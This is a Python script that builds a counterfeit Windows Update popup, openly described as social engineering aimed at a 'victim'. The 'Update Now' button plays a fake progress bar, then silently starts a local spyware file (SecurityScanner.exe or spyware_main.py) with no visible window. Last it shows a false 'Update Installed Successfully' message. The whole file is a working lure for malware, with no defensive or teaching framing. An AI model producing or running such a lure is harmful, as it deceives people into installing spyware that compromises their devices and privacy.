"""
FAKE UPDATE NOTIFICATION - Social Engineering Delivery
Creates a realistic Windows update notification that tricks victim

This shows a professional-looking "Windows Update Required" popup
When victim clicks "Update Now", it downloads and runs the spyware
"""

import tkinter as tk
from tkinter import messagebox
import os
import subprocess
import sys

class FakeUpdateNotification:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Windows Update")
        self.window.geometry("500x350")
        self.window.resizable(False, False)
        self.window.configure(bg='white')
        
        # Make it stay on top and look like system notification
        self.window.attributes('-topmost', True)
        
        # Position in bottom right (like real Windows notifications)
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        x = screen_width - 520
        y = screen_height - 400
        self.window.geometry(f"500x350+{x}+{y}")
        
        self.create_gui()
    
    def create_gui(self):
        """Create realistic Windows Update notification"""
        
        # Header with Windows logo color
        header = tk.Frame(self.window, bg='#0078D4', height=60)
        header.pack(fill='x')
        header.pack_propagate(False)
        
        # Windows logo and title
        title_label = tk.Label(header, 
                              text="🪟 Windows Update",
                              font=("Segoe UI", 16, "bold"),
                              bg='#0078D4',
                              fg='white')
        title_label.pack(pady=15)
        
        # Main content area
        content = tk.Frame(self.window, bg='white')
        content.pack(fill='both', expand=True, padx=30, pady=20)
        
        # Alert icon and message
        alert_frame = tk.Frame(content, bg='#fff4ce')
        alert_frame.pack(fill='x', pady=(0, 15))
        
        alert_msg = tk.Label(alert_frame,
                            text="⚠️ Critical Security Update Available",
                            font=("Segoe UI", 12, "bold"),
                            bg='#fff4ce',
                            fg='#d83b01')
        alert_msg.pack(pady=10)
        
        # Description
        desc_text = (
            "A critical security update is available for your device.\n\n"
            "Update: KB5034441 - Security Intelligence Update\n"
            "Priority: Critical\n"
            "Size: 2.4 MB\n\n"
            "This update addresses important security vulnerabilities\n"
            "and is recommended for all Windows users."
        )
        
        desc_label = tk.Label(content,
                             text=desc_text,
                             font=("Segoe UI", 10),
                             bg='white',
                             fg='#333',
                             justify='left')
        desc_label.pack(pady=10)
        
        # Buttons frame
        button_frame = tk.Frame(content, bg='white')
        button_frame.pack(pady=(20, 0))
        
        # Update Now button (green, prominent)
        update_btn = tk.Button(button_frame,
                               text="Update Now",
                               font=("Segoe UI", 11, "bold"),
                               bg='#107c10',
                               fg='white',
                               width=15,
                               height=2,
                               cursor='hand2',
                               relief='flat',
                               command=self.install_update)
        update_btn.pack(side='left', padx=5)
        
        # Remind Later button
        remind_btn = tk.Button(button_frame,
                              text="Remind Later",
                              font=("Segoe UI", 10),
                              bg='#e0e0e0',
                              fg='#333',
                              width=15,
                              height=2,
                              cursor='hand2',
                              relief='flat',
                              command=self.remind_later)
        remind_btn.pack(side='left', padx=5)
        
        # Footer note
        footer = tk.Label(content,
                         text="Recommended by Windows Security Center",
                         font=("Segoe UI", 8),
                         bg='white',
                         fg='#666')
        footer.pack(side='bottom', pady=(15, 0))
    
    def install_update(self):
        """When victim clicks 'Update Now' - download and run spyware"""
        self.window.destroy()
        
        # Show progress window
        progress_window = tk.Tk()
        progress_window.title("Installing Update")
        progress_window.geometry("400x150")
        progress_window.resizable(False, False)
        progress_window.configure(bg='white')
        progress_window.attributes('-topmost', True)
        
        # Center the window
        screen_width = progress_window.winfo_screenwidth()
        screen_height = progress_window.winfo_screenheight()
        x = (screen_width - 400) // 2
        y = (screen_height - 150) // 2
        progress_window.geometry(f"400x150+{x}+{y}")
        
        # Progress message
        tk.Label(progress_window,
                text="Installing Security Update...",
                font=("Segoe UI", 12, "bold"),
                bg='white').pack(pady=20)
        
        tk.Label(progress_window,
                text="Please wait while the update is being installed.\nThis may take a few minutes.",
                font=("Segoe UI", 10),
                bg='white').pack(pady=10)
        
        # Progress bar (fake)
        canvas = tk.Canvas(progress_window, width=350, height=25, bg='white', highlightthickness=0)
        canvas.pack(pady=10)
        canvas.create_rectangle(0, 0, 350, 25, outline='#ddd')
        
        # Animate progress bar
        def animate_progress(width=0):
            if width < 350:
                canvas.delete("progress")
                canvas.create_rectangle(0, 0, width, 25, fill='#0078D4', tags="progress")
                progress_window.after(30, lambda: animate_progress(width + 5))
            else:
                # Progress complete - run the actual spyware
                self.run_spyware(progress_window)
        
        animate_progress()
        progress_window.mainloop()
    
    def run_spyware(self, progress_window):
        """Execute the actual spyware after fake progress"""
        
        # Look for spyware executable
        spyware_paths = [
            "SecurityScanner.exe",
            os.path.join("..", "dist", "SecurityScanner.exe"),
            os.path.join("dist", "SecurityScanner.exe"),
            "spyware_main.py"
        ]
        
        spyware_found = None
        for path in spyware_paths:
            if os.path.exists(path):
                spyware_found = path
                break
        
        if spyware_found:
            try:
                if spyware_found.endswith('.py'):
                    # Run Python script
                    subprocess.Popen([sys.executable, spyware_found], 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    # Run executable
                    subprocess.Popen([spyware_found],
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                
                # Show success message
                progress_window.destroy()
                success = tk.Tk()
                success.title("Update Complete")
                success.geometry("350x120")
                success.resizable(False, False)
                success.configure(bg='white')
                success.attributes('-topmost', True)
                
                # Center window
                screen_width = success.winfo_screenwidth()
                screen_height = success.winfo_screenheight()
                x = (screen_width - 350) // 2
                y = (screen_height - 120) // 2
                success.geometry(f"350x120+{x}+{y}")
                
                tk.Label(success,
                        text="✓ Update Installed Successfully",
                        font=("Segoe UI", 12, "bold"),
                        bg='white',
                        fg='#107c10').pack(pady=20)
                
                tk.Label(success,
                        text="Your system is now up to date.",
                        font=("Segoe UI", 10),
                        bg='white').pack(pady=5)
                
                tk.Button(success,
                         text="OK",
                         font=("Segoe UI", 10),
                         bg='#0078D4',
                         fg='white',
                         width=10,
                         cursor='hand2',
                         command=success.destroy).pack(pady=10)
                
                # Auto-close after 3 seconds
                success.after(3000, success.destroy)
                success.mainloop()
                
            except Exception as e:
                progress_window.destroy()
                messagebox.showerror("Error", f"Update failed: {str(e)}")
        else:
            progress_window.destroy()
            messagebox.showerror("Error", "Update file not found. Please try again later.")
    
    def remind_later(self):
        """When victim clicks 'Remind Later'"""
        self.window.destroy()
        
        # Show reminder set confirmation
        reminder = tk.Tk()
        reminder.title("Reminder Set")
        reminder.geometry("300x100")
        reminder.resizable(False, False)
        reminder.configure(bg='white')
        
        tk.Label(reminder,
                text="✓ Reminder set for 4 hours",
                font=("Segoe UI", 11, "bold"),
                bg='white').pack(pady=20)
        
        tk.Button(reminder,
                 text="OK",
                 font=("Segoe UI", 10),
                 bg='#0078D4',
                 fg='white',
                 width=10,
                 command=reminder.destroy).pack(pady=5)
        
        reminder.after(2000, reminder.destroy)
        reminder.mainloop()
    
    def run(self):
        """Display the fake notification"""
        self.window.mainloop()


def main():
    print("=" * 70)
    print("FAKE WINDOWS UPDATE NOTIFICATION")
    print("=" * 70)
    print("\n[+] Showing fake Windows Update notification...")
    print("[+] This looks like a real Windows security update")
    print("[+] When victim clicks 'Update Now', spyware will be executed")
    print("\n[!] Make sure SecurityScanner.exe or spyware_main.py is available")
    print("\n" + "=" * 70 + "\n")
    
    # Create and show fake notification
    notification = FakeUpdateNotification()
    notification.run()

if __name__ == "__main__":
    main()
